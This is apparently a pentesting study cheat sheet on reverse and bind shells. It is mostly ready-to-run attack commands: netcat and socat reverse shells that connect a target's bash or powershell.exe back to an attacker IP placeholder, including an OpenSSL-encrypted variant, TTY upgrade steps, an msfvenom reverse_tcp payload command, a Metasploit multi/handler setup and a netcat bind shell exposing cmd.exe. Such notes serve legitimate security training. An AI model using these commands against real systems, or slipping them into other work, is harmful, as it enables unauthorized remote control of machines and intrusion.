---
icon: terminal
---

# Shells

### Key Concepts

#### Types of Shells

Interactive: you can interact with programs after executing them (e.g. nano)

* TeleTYpewriter (TTY): A fully interactive and stable terminal session

Non-Interactive: limited to using programs that don't require user interaction. Most reverse/bind shells are non-interactive.

## Reverse Shells

Target is forced to execute code that connects back to you computer. Attacker uses a listener to catch connection.

{% hint style="info" %}
Can bypass firewalls rules and is far more commonly used.
{% endhint %}

### Netcat

`nc -lvnp PORT_NUMBER`

`-l` act as a listener

`-v` request a verbose output

`-n` do not resolve hostnames or use DNS

`-p` indicates what port to use

{% hint style="info" %}
By default, netcat reverse shells are very unstable. We have to upgrade them.
{% endhint %}

#### Meterpreter to Netcat Shell

1. `meterpreter> shell` to open a standard shell
2. `nc -e /bin/bash <YOUR_IP> <PORT>` to start a netcat reverse shell from target machine

#### Upgrading a Netcat Shell

Python:

1. `python -c 'import pty;pty.spawn("/bin/bash")'` to spawn a bash shell on target machine
2. `export TERM=xterm` to allow Terminal commands (on attacker machine)
3. `Ctrl+Z` to background the current reverse shell process
4. `stty raw -echo` to pass all keystrokes to the remote shell
5. `fg` to bring the backgrounded reverse shell back to the foreground
6. (Once exited reverse shell) use `reset` to restore terminal to normal

rlwrap (Good for Windows shells):

1. `rlwrap nc -lvnp PORT_NUMBER`
2. Same process as above to stabilize

Socat:\
use netcat as a stepping stone into a fully-featured Socat shell, only on Linux targets. Can use Socat for basic Windows shells.

1. Transfer a socat static compiled binary to target machine
2. Windows:
   1. `socat TCP-L:PORT` for listener
   2. `socat TCP:LOCAL_IP:PORT EXEC:powershell.exe,pipes`
3. Linux (with stabilization)
   1. `socat TCP-L:PORT FILE:tty,raw,echo=0` for listener
   2. `socat TCP:LOCAL_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

We can also use encrypted socat shells, by replacing `TCP` with `OPENSSL` . You must have an SLL Certificate on the attacking machine:

```bash
#Generate certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
#Merge into one .pem file
cat shell.key shell.crt > shell.pem
#Reverse shell listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - verify=0
#On target machine
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Msfvenom

Used to generate code for reverse and bind shell, can also be used to generate hexadecimal shell code for buffer overflow exploit. Payloads in various formats of your choosing.

`msfvenom -p PAYLOAD OPTIONS`

`-f` specify output format

`-o` output location and filename

`LHOST=IP` specifies IP to connect back to

`LPORT=PORT` specify port on local machine to connect back to\\

e.g. `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST= LPORT=`

Payload Types:

* Staged: sent in two parts, stager piece of code on target machine that connects back to a listener to load real payload, does not touch the disk
* Stageless: self-contained but the payload is on the disk so it's easier to catch

Metasploit Multi/Handler is a good tool to catch reverse shells (especially for meterpreter shells)

```bash
msfconsole #open metasploit
use multi/handler
options
set PAYLOAD <PAYLOAD> LHOST <LOCAL-IP> LPORT <PORT>
exploit -j #-j to run as background
```

### Web Shells

Some websites allow the ability to upload an executable file to active a reverse or bind shell. They are typically run inside a webserver in a language like PHP.

## Bind Shells

The code executed is a listener attached to a shell directly on the target.

{% hint style="info" %}
May be protected by firewalls and is far less common.
{% endhint %}

On target machine: `nc -lvnp -e "cmd.exe"`

On attacker machine: `nc MACHINE_IP`
